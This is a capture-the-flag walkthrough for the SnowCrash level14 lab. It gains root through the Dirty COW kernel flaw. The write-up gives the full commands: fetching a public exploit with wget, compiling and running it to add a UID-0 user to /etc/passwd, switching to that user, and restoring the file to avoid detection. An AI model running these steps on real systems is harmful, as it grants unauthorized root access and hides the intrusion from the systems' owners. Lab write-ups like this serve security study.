# Level14 - SnowCrash

## Objective

Gain root access from the user `level14` using a known Linux kernel vulnerability called **Dirty COW**.

---

## Vulnerability Overview: Dirty COW (CVE-2016-5195)

**Dirty COW** is a privilege escalation vulnerability affecting Linux kernels older than 4.8.3. It exploits a race condition in the kernel’s **copy-on-write (COW)** mechanism, allowing an unprivileged user to **modify read-only files**, such as `/etc/passwd`.

This vulnerability can be abused to **add a root user** to the system.

---

## Exploitation Steps

### 1. Check Kernel Version

Login as `level14` and check the kernel version:

```bash
uname -a

Output:

Linux SnowCrash 3.2.0-89-generic-pae #127-Ubuntu SMP ... i686 GNU/Linux

This confirms that the kernel version is vulnerable.

2. Download the Dirty COW Exploit
Navigate to a writable directory like /tmp, then download the exploit:

cd /tmp
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
3. Compile the Exploit
Compile the exploit using GCC:

gcc -pthread dirty.c -o dirty -lcrypt
This generates a binary named dirty.

4. Run the Exploit

./dirty
You'll be prompted to enter a password for the fake root user (e.g., hackedroot). After running, the script adds a new root-level user entry to /etc/passwd:


firefart:<hashed_password>:0:0:pwned:/root:/bin/bash
This means the user firefart has UID 0 — the same as root.

5. Switch to the Root User

su firefart
Enter the password you provided during the exploit. You now have root access.

6. Clean Up
Important: Restore the original /etc/passwd file to avoid detection and system damage:

mv /tmp/passwd.bak /etc/passwd

